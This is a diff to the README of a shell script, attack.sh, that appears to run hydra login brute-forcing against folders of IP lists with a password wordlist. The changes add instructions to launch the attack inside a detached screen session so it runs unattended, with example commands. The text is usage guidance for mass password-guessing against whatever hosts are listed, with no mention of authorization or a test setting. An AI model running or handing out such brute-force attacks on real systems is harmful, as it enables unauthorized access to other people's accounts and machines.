@@ -49,11 +49,14 @@ hydra -L usernames.lst -P "$password"
 ```bash
 chmod +x attack.sh
 ```
+I advise running the attack inside a screen session to be able to leave it running without accidentally killing it:
 ```bash
+screen -S "attack"
 ./attack.sh <ip-list-location> <dictionary-location>
 # example:
-./attack.sh data wordlist/dict.txt
+screen -S "attack" ./attack.sh data wordlist/dict.txt
 # ^ will use every file in /home/<your user>/data/ folder as IP list and attack it with /home/<your user>/wordlist/dict.txt wordlist
+# CTRL + AD to Detach from the screen
 ```
 Script moves the used list file to "data-tested" folder and takes the next one from supplied folder. Did this for easier resume on crash or on stop.
 
